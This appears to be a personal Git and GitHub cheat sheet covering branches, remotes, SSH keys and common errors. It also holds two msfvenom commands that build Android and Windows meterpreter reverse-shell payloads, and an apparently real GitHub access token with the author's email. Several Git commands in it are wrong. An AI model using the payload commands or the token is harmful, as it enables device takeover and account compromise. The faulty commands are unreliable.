=> Advance Command
	1. Remove Specfic Folder	   
	  git add .
	  git reset foldername
	  OR git add --all :!foldername

	




=> push to project in github
	1. git init : create git file 
	2. git add . : add all file and folders
	3. git add fileName.extension
	4. git commit -m "Your comment"
	5. git branch -M branchName : default branch is master or main 
	5. git remote add origin https://github.com/dontKnew/food-devliery.git
	6. git remote -v : verify for url where's you are pushing..
	7. git push -u push origin branchname 
		-  git push push origin branchname  : assume already setup



=> If you want to show and hide files while using git command, 
	1. first create the branch and enter the branch 
	2. thereafter create file/folderd
	3. git add filename/folderName
	4. git commit "Your comment"
	4. now you will exits from branch, your file/folder will be invisible
	
=> Some Tips for Github
	1. before commit remove the files modification or back to last modification or discard modification : 
		i. first add fileName ii. git reset --hard
	2. git push --all origin : Push All Branches together
	3. git pull --all : fetch all branches together to local computer.
	4. git rm -r --cached path/filename  : remove the folder/file after git add and bofore commit  
	5. clone specific folder from github repositary 
		i. git clone --depth 1 https://github.com/user/repository.git folder
		ii. git clone https://github.com/user/repository.git folder

	
=> Github Errors
	1. unrelated-histories : git pull --allow-unrelated-histories 
	

=> SSH KEY SETUP on git bash window
	1. cmd: git config --global user.email "israfil123.sa@gmail.com"
	2. cmd : git config --global user.name "PHP Master"
	3. open command prompt
		cmd: ssh-keygen -t ed25519 -C "israfil123.sa@gmail.com"
			or 
		cmd for legacy system : ssh-keygen -t rsa -b 4096 -C "your_email@example.com" 
	4. cat ~/.ssh/id_ed25519.pub
	5. get the key and paste into ur github account https://github.com/settings/ssh/new
	6. first push git@github.com:dontKnew/auth-providers.git ask for first time authentication
	=> Testing for SSH Connection
		1. ssh -vT git@github.com  #for debuging..
		2. ssh -T git@github.com #msg ur github username if connected to github account





=> Git Errors Solution : 
	1.  allow-unrelated-histories command : git pull origin master  --allow-unrelated-histories
	2.  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
=> set origin in already set origin
	git remote set-url origin git@github.com:dontKnew/cheatsheet.git
	git remote set-url origin https://github.com/dontKnew/food-devliery.git


 OLD LUM SUMP CHEATS ::
 
18:60:24:1d:5d:96
 msfvenom â€“p android/meterpreter/reverse_tcp LHOST=18:60:24:1d:5d:96 LPORT=4444 R> ./ehacking.apk
/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=18:60:24:1d:5d:96 -f exe -o payload.exe
1. create branch
git branch branchname

2. enter branch
git checkout branchname

3. merge multiple or two branch/  go to current branch or main branch or create branch and merge
git merge branchlocation or name

4. ignore folder for push project
touch .gitignore

5. check origin where push the project
git remote -v (before push set original 

7. check log of git/ changes all things commited
git log
8. change in file (after command write 'i' for enter the file

10. update project from github in computer
git pull origin branchName

11. restore from previous changed
git restore --staged

12. git remote remove origin 
remove origin link from current git file

13. First fetch data from github then if u run merge command they will apply changes from github.com to locally computer
Command : git fetch and git merge
Note : Both command also called one command : git pull origin master

14. see current branch
git rev-parse --abbrev-ref HEAD or  git branch --show-current

15. see all branch name 
git branch

=> add collaborator for change in project. ( collaborators must be have github profile)
1. github profile -> respository project -> settings -> manage access 


